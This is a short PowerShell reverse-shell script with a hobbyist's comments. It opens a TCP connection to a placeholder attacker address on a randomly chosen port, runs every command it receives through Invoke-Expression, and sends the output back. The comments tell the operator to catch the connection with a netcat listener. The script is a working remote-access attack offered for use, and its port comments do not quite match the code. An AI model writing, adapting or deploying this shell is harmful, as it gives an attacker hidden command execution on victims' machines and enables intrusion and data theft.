#this program is what mamkws the reverse shell as a listener you can use netcat in the ports you have specified (nc -lvnp)
$x = Get-Random -Maximum 2 #variable to select the ports, just set the maximum amount to the ports you've put
$y = 2000, 4000 #variable with the ports, I used 2000..2005 and 4000..4005 (up to 005 for the Get-Random -Maximum 5, as said before, change it to your liking)
#change the "YOUR_IP" with your IP
$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",($y[$x] + (Get-Random -Maximum 5)));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
